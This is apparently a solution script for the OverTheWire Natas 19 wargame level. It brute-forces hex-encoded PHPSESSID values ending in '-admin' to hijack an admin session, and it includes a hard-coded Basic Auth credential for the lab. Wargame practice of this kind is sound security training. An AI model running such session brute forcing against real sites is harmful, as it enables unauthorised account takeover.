import requests

url = 'http://natas19.natas.labs.overthewire.org/index.php?debug'
headers = { 'Authorization': 'Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==' }

# index generates a PHPSESSID based on "(?:3.)(?:3.)(?:3.)2d61646d696e" pattern
def send_payload(index):
    dig = str(index)
    if index <= 9:
        pattern = f'3{dig[0]}'
    elif index <= 99:
        pattern = f'3{dig[0]}3{dig[1]}'
    else:
        pattern = f'3{dig[0]}3{dig[1]}3{dig[2]}'
    sessid = f'{pattern}2d61646d696e'
    cookies = { 'PHPSESSID': sessid }
    r = requests.get(url, headers=headers, cookies=cookies)
    raw = str(r.content)
    return "The credentials for the next level are" in raw, sessid

index = 0; found = False
while not found and index <= 999:
    match, sessid = send_payload(index)
    if match:
        print(f'matched. PHPSESSID = {sessid}')
        found = True
    else:
        print(f'did not match. index = {index}')
        index += 1
